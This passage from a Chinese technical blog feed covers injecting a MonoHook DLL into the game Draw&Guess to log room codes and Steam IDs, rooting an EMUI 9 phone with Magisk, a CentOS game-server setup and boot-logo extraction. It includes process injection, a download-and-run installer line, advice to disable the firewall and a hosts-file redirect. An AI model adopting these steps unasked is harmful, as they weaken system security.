<p>双击<code>UserCode_RpcGetCountdown</code>函数，查看函数体：<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/dag-history-6.png"></p>
<p>功能是调用<code>LobbyChat.Instance.ReceiveChat</code>函数，更新聊天框内容</p>
<p>由此，选择在<code>LobbyPlayerInfo.UserCode_RpcGetCountdown</code>函数调用后（游戏即将开始时），保存房间代码及玩家列表。（保存上次调用时间，超过10秒则保存房间数据到本地）</p>
<p>同时，为了提示模块已经加载，选择在<code>LobbyChat.Start</code>函数调用后输出提示信息。</p>
<p>PS：由于<code>LobbyChat</code>实际上是更新一个<code>TextMeshProUGUI</code>（支持富文本标签），所以可以指定字体大小、颜色等属性。（在别人房间里发送，会被服务器断开连接）</p>
<p><code>TextMesh Pro</code>支持的富文本标签见<a href="http://digitalnativestudios.com/textmeshpro/docs/rich-text/">Rich Text</a></p>
<h2 id="注入模块开发"><a href="#注入模块开发" class="headerlink" title="注入模块开发"></a>注入模块开发</h2><p>基于<a href="https://github.com/Misaka-Mikoto-Tech/MonoHook">MonoHook</a>，开发一个注入dll</p>
<h3 id="创建项目并导入依赖"><a href="#创建项目并导入依赖" class="headerlink" title="创建项目并导入依赖"></a>创建项目并导入依赖</h3><p>在<code>Visual Studio</code>中创建一个<code>.Net 4.0</code>类库项目，将必要的游戏dll添加为依赖。</p>
<h3 id="编写注入代码"><a href="#编写注入代码" class="headerlink" title="编写注入代码"></a>编写注入代码</h3><p>此处仅贴出关键代码，完整项目代码见<a href="https://github.com/XhyEax/DAGHistory">DAGHistory</a></p>
<h4 id="模块加载提示"><a href="#模块加载提示" class="headerlink" title="模块加载提示"></a>模块加载提示</h4><p>hook <code>LobbyChat.Start</code>函数，在聊天界面创建后输出信息。</p>
<figure class="highlight cs"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">StartReplace</span>(<span class="params"></span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 先调用原函数</span></span><br><span class="line">        StartProxy();</span><br><span class="line">        <span class="comment">// 输出信息到聊天框</span></span><br><span class="line">        LobbyChat.Instance.ReceiveChat(<span class="string">&quot;&lt;color=#778899&gt;[DAGHistory]: Loaded&lt;/color&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/dag-history-7.png"></p>
<h4 id="自定义类RoomData"><a href="#自定义类RoomData" class="headerlink" title="自定义类RoomData"></a>自定义类RoomData</h4><p>使用该类保存房间数据。</p>
<figure class="highlight cs"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Player</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">ulong</span> steamID;</span><br><span class="line">    <span class="built_in">string</span> name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Player</span>(<span class="params"><span class="built_in">string</span> name, <span class="built_in">ulong</span> steamID</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.steamID = steamID;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> Name &#123; <span class="keyword">get</span> =&gt; name; <span class="keyword">set</span> =&gt; name = <span class="keyword">value</span>; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">ulong</span> SteamID &#123; <span class="keyword">get</span> =&gt; steamID; <span class="keyword">set</span> =&gt; steamID = <span class="keyword">value</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">RoomData</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">string</span> roomCode;</span><br><span class="line">    List&lt;Player&gt; playerList;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> RoomCode &#123; <span class="keyword">get</span> =&gt; roomCode; <span class="keyword">set</span> =&gt; roomCode = <span class="keyword">value</span>; &#125;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Player&gt; PlayerList &#123; <span class="keyword">get</span> =&gt; playerList; <span class="keyword">set</span> =&gt; playerList = <span class="keyword">value</span>; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="built_in">string</span> <span class="title">ToString</span>(<span class="params"></span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> JsonConvert.SerializeObject(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>重载<code>ToString</code>函数，使用Json序列化该对象。</p>
<h4 id="获取房间数据"><a href="#获取房间数据" class="headerlink" title="获取房间数据"></a>获取房间数据</h4><p>遍历<code>LobbyPlayerList.Instance.Players</code>，并生成房间代码，保存到<code>RoomData</code>对象。</p>
<figure class="highlight cs"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> RoomData <span class="title">getRoomData</span>(<span class="params"></span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    RoomData roomData = <span class="keyword">new</span> RoomData();</span><br><span class="line">    <span class="keyword">if</span> (LobbyPlayerList.Instance != <span class="literal">null</span> &amp;&amp; LobbyPlayerList.Instance.Players != <span class="literal">null</span></span><br><span class="line">        &amp;&amp; LobbyPlayerList.Instance.Players.Count != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        List&lt;LobbyPlayerInfo&gt; players = LobbyPlayerList.Instance.Players;</span><br><span class="line">        roomData.PlayerList = <span class="keyword">new</span> List&lt;Player&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; players.Count; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            LobbyPlayerInfo lobbyPlayerInfo = players[i];</span><br><span class="line">            <span class="built_in">string</span> name = lobbyPlayerInfo.Name;</span><br><span class="line">            <span class="built_in">ulong</span> steamID = lobbyPlayerInfo.SteamID.m_SteamID;</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                roomData.RoomCode = CodeEncoder.codeEncode(steamID);</span><br><span class="line">            &#125;</span><br><span class="line">            roomData.PlayerList.Add(<span class="keyword">new</span> Player(name, steamID));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> roomData;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h4 id="自动保存房间数据"><a href="#自动保存房间数据" class="headerlink" title="自动保存房间数据"></a>自动保存房间数据</h4><p>hook <code>LobbyPlayerInfo.UserCode_RpcGetCountdown</code>函数，判断是否需要保存房间数据到文件。</p>
<figure class="highlight cs"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">UserCode_RpcGetCountdownReplace</span>(<span class="params"><span class="built_in">byte</span> s</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 调用原函数</span></span><br><span class="line">        UserCode_RpcGetCountdownProxy(s);</span><br><span class="line">        <span class="comment">// 如果距离上一次调用该函数超过10秒，获取房间数据并保存到文件</span></span><br><span class="line">        <span class="keyword">if</span> (Time.realtimeSinceStartup - lastCallTime &gt; <span class="number">10</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            RoomUtil.saveRoomData();</span><br><span class="line">            LobbyChat.Instance.ReceiveChat(<span class="string">&quot;&lt;color=#778899&gt;[DAGHistory]: Saved&lt;/color&gt;&quot;</span>);</span><br><span class="line">            lastCallTime = Time.realtimeSinceStartup;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="加入房间"><a href="#加入房间" class="headerlink" title="加入房间"></a>加入房间</h4><p>分析发现该功能最终调用的是<code>LobbyManager.s_Singleton.Join</code>函数，传入<code>steamID</code>，照搬即可。</p>
<figure class="highlight cs"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">joinRoom</span>(<span class="params"><span class="built_in">string</span> code</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (code != <span class="literal">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        LobbyManager.s_Singleton.Join(CodeEncoder.codeDecode(code).ToString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="获取日志路径"><a href="#获取日志路径" class="headerlink" title="获取日志路径"></a>获取日志路径</h4><p>参考<code>LogFileOpener.ReturnLogPath</code>函数，编写以下代码（将默认值替换为临时文件夹）。</p>
<figure class="highlight cs"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">ReturnLogPath</span>(<span class="params"></span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    RuntimePlatform platform = Application.platform;</span><br><span class="line">    <span class="keyword">switch</span> (platform)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> RuntimePlatform.OSXEditor:</span><br><span class="line">        <span class="keyword">case</span> RuntimePlatform.OSXPlayer:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;~/Library/Logs/Unity/&quot;</span>;</span><br><span class="line">        <span class="keyword">case</span> RuntimePlatform.LinuxPlayer:</span><br><span class="line">        <span class="keyword">case</span> RuntimePlatform.LinuxEditor:</span><br><span class="line">            <span class="keyword">return</span> Path.Combine(<span class="string">&quot;~/.config/unity3d&quot;</span>, Application.companyName, <span class="string">&quot;Draw_Guess&quot;</span>);</span><br><span class="line">        <span class="keyword">case</span> RuntimePlatform.WindowsPlayer:</span><br><span class="line">            <span class="keyword">return</span> Path.Combine(Environment.GetEnvironmentVariable(<span class="string">&quot;AppData&quot;</span>), <span class="string">&quot;..&quot;</span>, <span class="string">&quot;LocalLow&quot;</span>,</span><br><span class="line">                Application.companyName, <span class="string">&quot;Draw_Guess&quot;</span>);</span><br><span class="line">        <span class="literal">default</span>:</span><br><span class="line">            <span class="keyword">return</span> Path.GetTempPath();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>点击左下角<code>Logs</code>打开该目录：<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/dag-history-8.png"></p>
<h4 id="GUI"><a href="#GUI" class="headerlink" title="GUI"></a>GUI</h4><p>为方便使用，增加图形操作界面，提供手动保存、复制上局房间代码、加入上局房间功能。</p>
<p><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/dag-history-9.png"></p>
<p>并设置按后引号键（esc下方）隐藏该界面。</p>
<h3 id="生成dll文件"><a href="#生成dll文件" class="headerlink" title="生成dll文件"></a>生成dll文件</h3><p>在<code>Visual Studio</code>中选择生成<code>DAGHistory</code>，得到<code>bin\Debug\DAGHistory.dll</code></p>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>使用<a href="https://github.com/warbler/SharpMonoInjector/releases/tag/v2.2">SharpMonoInjector</a><br>提供的命令行注入工具<code>SharpMonoInjector.Console</code>进行注入</p>
<h3 id="注入dll并调用Load函数"><a href="#注入dll并调用Load函数" class="headerlink" title="注入dll并调用Load函数"></a>注入dll并调用Load函数</h3><p>将<code>smi.exe</code>、<code>SharpMonoInjector.dll</code>、待注入dll放到同一目录下，在该目录执行以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.\smi.exe -p &quot;Draw&amp;Guess&quot; -a &quot;DAGHistory.dll&quot; -n &quot;DAGHistory&quot; -c &quot;Loader&quot; -m &quot;Load&quot; inject</span><br></pre></td></tr></table></figure>
<p>之后使用相关功能即可。</p>
<h3 id="查看日志"><a href="#查看日志" class="headerlink" title="查看日志"></a>查看日志</h3><p>点击游戏左下角<code>Logs</code>打开日志目录（Windows：<code>C:\Users\用户名\AppData\LocalLow\Acureus\Draw_Guess</code>）<br>其中<code>LastRoom.json</code>和<code>DAGHistory.log</code>即注入模块生成的日志文件。<br>前者保存上次游玩的房间数据（用于复制代码及快速加入），后者保存历史记录。</p>
]]></content>
      <tags>
        <tag>Unity</tag>
        <tag>Mono</tag>
      </tags>
  </entry>
  <entry>
    <title>emui9安装Magisk框架</title>
    <url>/2019/04/02/emui9-magisk-install/</url>
    <content><![CDATA[<h2 id="准备条件"><a href="#准备条件" class="headerlink" title="准备条件"></a>准备条件</h2><p>(设备已解锁BL，电脑fastboot环境正常是前提条件)<br>已下载magisk框架rec安装包（<a href="https://github.com/topjohnwu/Magisk/releases/">github下载</a>），有sd卡（<code>adb sideload</code>未测试是否可安装，建议用内存卡），并已安装第三方recovery（以下简称rec）<br>或<br>已安装magisk框架app，且有原厂<code>recovery_ramdisk</code>镜像</p>
<h2 id="安装方式"><a href="#安装方式" class="headerlink" title="安装方式"></a>安装方式</h2><p>fastboot刷入命令（华为没有boot分区，所以rec也是通过这个指令刷入）<br>(BOOT.img请自行替换为对应镜像名)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fastboot flash recovery_ramdisk BOOT.img</span><br></pre></td></tr></table></figure>
<h3 id="rec安装法"><a href="#rec安装法" class="headerlink" title="rec安装法"></a>rec安装法</h3><p>启动至第三方rec，从sd卡选择magisk卡刷包，安装。<br>安装完成后选择重启到rec模式，即可进入带面具的系统</p>
<h3 id="修补镜像直接刷入法"><a href="#修补镜像直接刷入法" class="headerlink" title="修补镜像直接刷入法"></a>修补镜像直接刷入法</h3><p>参考<a href="https://club.huawei.com/thread-18856510-1-1.html">【荣耀v10】EMui9.0.0.181刷magisk框架及root教程</a>，个人未测试，应该可行<br>提取出原厂<code>recovery_ramdisk</code>镜像（从官方线刷包或其他地方获得），并发送到手机（模拟器应该也行）<br>使用magisk框架app，选择安装，修补boot镜像，选择提取出的原厂镜像<br>修补完成后传回电脑，手机进入fastboot模式，刷入即可</p>
<h2 id="启动方式"><a href="#启动方式" class="headerlink" title="启动方式"></a>启动方式</h2><p>由于修补的镜像其实是rec分区，所以要按照进入rec的方式进入带面具的系统。<br>（个人测试，在带magisk的系统下重启仍然是有root的，等价于启动到rec）<br>具体操作如图（图源自参考帖）<br><img src="https://clubimg.club.vmall.com/data/attachment/forum/201902/11/221928oai3dhzxzbbrd42d.jpg"></p>
<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>如果安装了不适配的模块，还是需要刷入第三方rec，进入后删除<code>/data/adb</code>文件夹，然后即可正常开机（magisk要重刷）。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://club.huawei.com/thread-18856510-1-1.html">【荣耀v10】EMui9.0.0.181刷magisk框架及root教程</a></p>
]]></content>
      <tags>
        <tag>经验</tag>
      </tags>
  </entry>
  <entry>
    <title>饥荒联机版 Linux(CentOS) 开服、mod安装</title>
    <url>/2020/08/18/dst-server-linux/</url>
    <content><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>腾讯云服务器，CentOS 7.7 64位， 1核CPU，1G内存，1G交换空间</p>
<h3 id="交换空间配置"><a href="#交换空间配置" class="headerlink" title="交换空间配置"></a>交换空间配置</h3><p>见<a href="https://blog.xhyeax.com/2020/03/25/linux-set-swapfile/">Linux配置虚拟内存文件</a></p>
<h2 id="获取cluster-token"><a href="#获取cluster-token" class="headerlink" title="获取cluster_token"></a>获取cluster_token</h2><p>打开饥荒，控制台输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TheNet:GenerateClusterToken()</span><br></pre></td></tr></table></figure>
<p>然后使用资源管理器定位到<code>...\文档\Klei\DoNotStarveTogether\用户id</code>，下面有一个刚生成的<code>cluster_token.txt</code>，把内容保存下来，之后要用</p>
<span id="more"></span>
<h2 id="服务器安装"><a href="#服务器安装" class="headerlink" title="服务器安装"></a>服务器安装</h2><h3 id="创建用户并设置密码"><a href="#创建用户并设置密码" class="headerlink" title="创建用户并设置密码"></a>创建用户并设置密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adduser dstserver</span><br><span class="line">passwd dstserver</span><br></pre></td></tr></table></figure>
<h3 id="开放以下端口"><a href="#开放以下端口" class="headerlink" title="开放以下端口"></a>开放以下端口</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">11000/udp</span><br><span class="line">27018/udp</span><br></pre></td></tr></table></figure>
<p>PS：云服务器一般是在安全组规则中设置放行<br>同时关闭系统自带的防火墙（root用户执行<code>service firewalld stop</code>）并禁止自启动(<code>systemctl disable firewalld.service</code>)</p>
<h3 id="切换用户"><a href="#切换用户" class="headerlink" title="切换用户"></a>切换用户</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su - dstserver</span><br></pre></td></tr></table></figure>
<h3 id="下载并运行一键安装脚本"><a href="#下载并运行一键安装脚本" class="headerlink" title="下载并运行一键安装脚本"></a>下载并运行一键安装脚本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -O linuxgsm.sh https://linuxgsm.sh &amp;&amp; chmod +x linuxgsm.sh &amp;&amp; bash linuxgsm.sh dstserver</span><br></pre></td></tr></table></figure>
<p>PS：如果访问<code>raw.githubusercontent.com</code>经常出错，可修改hosts文件（<code>/etc/hosts</code>），添加以下内容（root用户）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">199.232.4.133 raw.githubusercontent.com</span><br></pre></td></tr></table></figure>
<h3 id="运行安装文件"><a href="#运行安装文件" class="headerlink" title="运行安装文件"></a>运行安装文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./dstserver install</span><br></pre></td></tr></table></figure>
<p>一路回车，直到提示输入cluster_token</p>
<h3 id="安装过程中可能出现的问题"><a href="#安装过程中可能出现的问题" class="headerlink" title="安装过程中可能出现的问题"></a>安装过程中可能出现的问题</h3><h4 id="出现-ERROR、FAIL"><a href="#出现-ERROR、FAIL" class="headerlink" title="出现 ERROR、FAIL"></a>出现 ERROR、FAIL</h4><p>一般是网络问题导致的下载失败，删除报错的脚本后重新执行<code>./dstserver install</code></p>
<h4 id="依赖程序包缺失"><a href="#依赖程序包缺失" class="headerlink" title="依赖程序包缺失"></a>依赖程序包缺失</h4><p>表现为check_deps.sh执行时，出现红字<br>使用yum命令安装缺失程序包即可<br>如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install python3 jq -y</span><br></pre></td></tr></table></figure>
<p>之后再次执行<code>./dstserver install</code></p>
<h2 id="开服相关"><a href="#开服相关" class="headerlink" title="开服相关"></a>开服相关</h2><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>以创建的第一个世界为例，配置文件位于<code>/home/dstserver/.klei/DoNotStarveTogether/Cluster_1/cluster.ini</code></p>
<h4 id="配置文件模板"><a href="#配置文件模板" class="headerlink" title="配置文件模板"></a>配置文件模板</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[GAMEPLAY]</span><br><span class="line">game_mode = endless         # 游戏模式</span><br><span class="line">max_players = 8             # 最大玩家人数</span><br><span class="line">pvp = false                 # pvp开关</span><br><span class="line">pause_when_empty = true     # 没人在线时暂停世界</span><br><span class="line">vote_enabled = true         # 投票开关(投票T人，投票重置世界)</span><br><span class="line"></span><br><span class="line">[NETWORK]</span><br><span class="line">lan_only_cluster = false    # 只允许本地局域网加入开关</span><br><span class="line">offline_cluster = false     # 离线游戏</span><br><span class="line">cluster_description = &#x27;0.0&#x27; # 服务器简介</span><br><span class="line">cluster_name = &#x27;My World&#x27;   # 服务器名称</span><br><span class="line">cluster_intention = cooperative     # 服务器类型</span><br><span class="line">cluster_password = 123456   # 服务器密码</span><br><span class="line">tick_rate = 30              # 帧刷新频率</span><br><span class="line">connection_timeout = 120000 # 掉线等待时间，单位毫秒</span><br><span class="line">whitelist_slots = 1         # 白名单个数</span><br><span class="line">autosaver_enabled = true    # 天亮自动保存</span><br><span class="line"></span><br><span class="line">[MISC]</span><br><span class="line">console_enable = true       # 是否开启控制台</span><br><span class="line">max_snapshots = 6           # 最大快照</span><br><span class="line"></span><br><span class="line">[SHARD]</span><br><span class="line">shard_enabled = true        # 是否多世界</span><br><span class="line">bind_ip = 127.0.0.1         # 主从世界在同一台服务器上(默认)</span><br><span class="line">master_ip = 127.0.0.1       # 主从世界在同一台服务器上(默认)</span><br><span class="line">master_port = 10888         # 端口</span><br><span class="line">cluster_key = rain          # 主从世界连接密码</span><br><span class="line"></span><br><span class="line">[STEAM]</span><br><span class="line">steam_group_only = false    # 是否只允许同steam组的人加入</span><br><span class="line">steam_group_id = 2222222    # steam组ID</span><br><span class="line">steam_group_admins = true   # steam组员自动成为管理员</span><br></pre></td></tr></table></figure>
<h4 id="个人配置"><a href="#个人配置" class="headerlink" title="个人配置"></a>个人配置</h4><p>修改了游戏模式、服务器名、服务器描述、服务器密码、帧刷新频率、天亮自动保存</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[GAMEPLAY]</span><br><span class="line">game_mode = endless</span><br><span class="line">max_players = 6</span><br><span class="line">pause_when_empty = true</span><br><span class="line">pvp = false</span><br><span class="line">vote_enabled = true</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[MISC]</span><br><span class="line">console_enabled = true</span><br><span class="line">max_snapshots = 6</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[NETWORK]</span><br><span class="line">cluster_description = Hello World!</span><br><span class="line">cluster_name = Xhy&#x27;s Ark</span><br><span class="line">cluster_intention = cooperative</span><br><span class="line">cluster_password = whatisit</span><br><span class="line">tick_rate = 60</span><br><span class="line">autosaver_enabled = true</span><br><span class="line"></span><br><span class="line">[SHARD]</span><br><span class="line">shard_enabled = false</span><br><span class="line">bind_ip = 127.0.0.1</span><br><span class="line">master_ip = 127.0.0.1</span><br><span class="line">master_port = 10888</span><br><span class="line">cluster_key = xhy</span><br></pre></td></tr></table></figure>
<h3 id="Mod安装"><a href="#Mod安装" class="headerlink" title="Mod安装"></a>Mod安装</h3><p>编辑<code>/home/dstserver/serverfiles/mods/dedicated_server_mods_setup.lua</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ServerModSetup(&quot;666155465&quot;)</span><br><span class="line">ServerModSetup(&quot;374550642&quot;)</span><br></pre></td></tr></table></figure>
<h3 id="Mod加载"><a href="#Mod加载" class="headerlink" title="Mod加载"></a>Mod加载</h3><p>编辑<code>/home/dstserver/serverfiles/mods/modsettings.lua</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ForceEnableMod(&quot;666155465&quot;)</span><br><span class="line">ForceEnableMod(&quot;374550642&quot;)</span><br></pre></td></tr></table></figure>
<p>注意：Mod加载的越多，服务器负载越大，建议只使用一些基础mod</p>
<h2 id="更新服务器"><a href="#更新服务器" class="headerlink" title="更新服务器"></a>更新服务器</h2><h3 id="手动更新"><a href="#手动更新" class="headerlink" title="手动更新"></a>手动更新</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./dstserver update</span><br></pre></td></tr></table></figure>
<h3 id="启动自动更新"><a href="#启动自动更新" class="headerlink" title="启动自动更新"></a>启动自动更新</h3><p>修改<code>/home/dstserver/lgsm/config-lgsm/dstserver/dstserver.cfg</code>：<br>添加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">updateonstart=&quot;on&quot;</span><br></pre></td></tr></table></figure>
<p>之后如果服务器更新直接执行<code>./dstserver restart</code><br>注意：更新后Mod需要重新配置</p>
<h3 id="修改mod配置为只读"><a href="#修改mod配置为只读" class="headerlink" title="修改mod配置为只读"></a>修改mod配置为只读</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 444 /home/dstserver/serverfiles/mods/dedicated_server_mods_setup.lua</span><br><span class="line">chmod 444 /home/dstserver/serverfiles/mods/modsettings.lua</span><br></pre></td></tr></table></figure>
<p>之后需要修改的话要把权限改回来</p>
<h2 id="加入服务器"><a href="#加入服务器" class="headerlink" title="加入服务器"></a>加入服务器</h2><h3 id="手动收藏"><a href="#手动收藏" class="headerlink" title="手动收藏"></a>手动收藏</h3><p>打开steam主窗口，左上角<code>视图</code>-<code>服务器</code>（如图所示）<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/ark-server.png" alt="视图"><br>在<code>收藏夹</code>中点击<code>添加服务器</code>，输入地址后点击<code>在此地址上寻找游戏</code>，<code>将选定的游戏添加到收藏夹</code>，然后<code>连接</code>即可。</p>
<h3 id="浏览世界-使用过滤器搜索"><a href="#浏览世界-使用过滤器搜索" class="headerlink" title="浏览世界-使用过滤器搜索"></a>浏览世界-使用过滤器搜索</h3><p>直接输入配置好的服务器名，然后搜索即可<br>之后可以直接检索<code>我玩过的</code><br>PS：网络不好的话，检索可能需要花费较多时间，建议直接从收藏夹进入服务器</p>
<h3 id="游戏内使用控制台连接"><a href="#游戏内使用控制台连接" class="headerlink" title="游戏内使用控制台连接"></a>游戏内使用控制台连接</h3><p>打开控制台，输入(<code>1.2.3.4</code>改为服务器ip)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c_connect(&quot;1.2.3.4&quot;,11000)</span><br></pre></td></tr></table></figure>
<h2 id="回档"><a href="#回档" class="headerlink" title="回档"></a>回档</h2><p>管理员进入服务器后，按住tab键，点击左上角菜单-回档</p>
<h2 id="关于延迟"><a href="#关于延迟" class="headerlink" title="关于延迟"></a>关于延迟</h2><p>如果感觉拾取物品有一定延迟，可以在客户端的设置中把延迟补偿关掉</p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="服务器文件解析"><a href="#服务器文件解析" class="headerlink" title="服务器文件解析"></a>服务器文件解析</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件夹:</span><br><span class="line">/home/dstserver/.klei/DoNotStarveTogether/Cluster_1/ --服务器根目录</span><br><span class="line">/home/dstserver/.klei/DoNotStarveTogether/Cluster_1/Master --地表存档根目录</span><br><span class="line">/home/dstserver/.klei/DoNotStarveTogether/Cluster_1/Caves --洞穴存档根目录</span><br><span class="line"></span><br><span class="line">文件:</span><br><span class="line">/home/dstserver/.klei/DoNotStarveTogether/Cluster_1/cluster.ini --服务器设置文件</span><br><span class="line">/home/dstserver/.klei/DoNotStarveTogether/Cluster_1/cluster_token.txt --令牌文件</span><br><span class="line"></span><br><span class="line">/home/dstserver/.klei/DoNotStarveTogether/Cluster_1/Master/server.ini --地表存档设置文件</span><br><span class="line">/home/dstserver/.klei/DoNotStarveTogether/Cluster_1/Master/modoverrides.lua --mod配置文件</span><br><span class="line">/home/dstserver/.klei/DoNotStarveTogether/Cluster_1/Master/worldgenoverride.lua(可选) --地图配置文件</span><br><span class="line"></span><br><span class="line">/home/dstserver/.klei/DoNotStarveTogether/Cluster_1/Caves/server.ini --洞穴存档设置文件</span><br><span class="line">文档/home/dstserver/.klei/DoNotStarveTogether/Cluster_1/Caves/modoverrides.lua --mod配置文件</span><br><span class="line">文档/home/dstserver/.klei/DoNotStarveTogether/Cluster_1/Caves/worldgenoverride.lua --地图配置文件</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.jianshu.com/p/75cc3cfaf117">Linux 搭建饥荒联机版服务器</a></p>
]]></content>
      <tags>
        <tag>经验</tag>
      </tags>
  </entry>
  <entry>
    <title>提取MIUI fastboot界面图片</title>
    <url>/2021/09/25/extract-miui-fastboot-image/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>在酷安看到一张表情包，素材是MIUI fastboot界面图片，但是不够清晰，于是考虑自己提取。</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><blockquote>
<p>splash.img (or splash.bin or logo.img or logo.bin) is the raw file in which the boot logo (splash screen - the picture displayed when the device is booted) is stored.<br>It is stored under the partition: splash or logo in many Snapdragon devices (might vary for devices)</p>
</blockquote>
<span id="more"></span>

<h2 id="MTK"><a href="#MTK" class="headerlink" title="MTK"></a>MTK</h2><h3 id="导出logo分区"><a href="#导出logo分区" class="headerlink" title="导出logo分区"></a>导出logo分区</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dd if=/dev/block/bootdevice/by-name/logo of=/sdcard/logo.bin</span><br></pre></td></tr></table></figure>
<h3 id="提取图片"><a href="#提取图片" class="headerlink" title="提取图片"></a>提取图片</h3><p>使用<a href="https://sites.google.com/site/kadanutilities/home/logobuilder-en">LogoBuilder</a>提取。</p>
<h2 id="高通"><a href="#高通" class="headerlink" title="高通"></a>高通</h2><h3 id="导出splash分区"><a href="#导出splash分区" class="headerlink" title="导出splash分区"></a>导出splash分区</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dd if=/dev/block/bootdevice/by-name/splash of=/sdcard/splash.img</span><br></pre></td></tr></table></figure>
<h3 id="提取图片-1"><a href="#提取图片-1" class="headerlink" title="提取图片"></a>提取图片</h3><p>使用<a href="https://github.com/ReFirmLabs/binwalk">binwalk</a>分析<code>splash.img</code> （建议使用Linux操作）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">binwalk -e splash.img</span><br></pre></td></tr></table></figure>
<p>结果类似于：</p>
